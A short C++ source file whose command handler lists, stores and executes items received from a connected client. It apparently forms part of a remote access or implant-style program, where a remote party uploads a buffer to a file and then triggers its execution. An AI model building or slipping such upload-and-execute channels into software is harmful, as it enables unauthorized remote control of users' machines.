#include "DatabaseCommand.h"

int DatabaseCommand::activate(Client* c, list<string> params)
{
    string* arr = new string[params.size()];
    copy(params.begin(), params.end(), arr);
    if (params.size() > 0) {
        string option = arr[0];
        if (option == string("list")) {
            c->send_msg((char*)c->getDB()->ListData().c_str());
            return 0;
        }
        else if (option == string("add")) {
            if (params.size() > 1) {
                c->send_msg((char*)"BEGIN");
                DWORD len;
                char* dynBuff = c->recvall(&len);
                c->getDB()->CreateFile((LPSTR)arr[1].c_str());
                int in = c->getDB()->WriteData((LPSTR)arr[1].c_str(), dynBuff, len);
                delete[] dynBuff;
                return in;
            }
        }
        else if (option == string("execute")) {
            if (params.size() > 1) {
                c->send_msg((char*)"EXEC");
                return c->getDB()->ExecData((LPSTR)arr[1].c_str());
            }
        }
        else {
            
        }

    }
    return 0;
}
